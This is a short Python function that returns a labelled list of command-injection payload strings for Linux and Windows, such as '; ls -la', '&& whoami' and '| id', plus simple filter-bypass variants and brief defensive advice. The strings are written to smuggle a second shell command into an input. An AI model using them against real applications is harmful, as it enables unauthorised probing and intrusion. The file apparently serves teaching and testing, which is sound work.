def generate():
    """
    Advanced Command Injection templates.
    Educational use only.
    """

    payloads = []

    payloads.append("# TEMPLATE - EDUCATIONAL USE ONLY")
    payloads.append("")

    payloads.append("=== Linux Patterns ===")
    payloads.append("; ls -la")
    payloads.append("&& whoami")
    payloads.append("| id")

    payloads.append("")
    payloads.append("=== Windows Patterns ===")
    payloads.append("& dir")
    payloads.append("&& echo %username%")

    payloads.append("")
    payloads.append("=== Bypass Concepts ===")
    payloads.append(";   ls")
    payloads.append("; ls #")
    payloads.append("Using environment variables to bypass filters")

    payloads.append("")
    payloads.append("=== Defensive Notes ===")
    payloads.append("Use input validation and allow-listing.")
    payloads.append("Avoid system() with user input.")
    payloads.append("Use safe APIs instead of shell execution.")

    return payloads
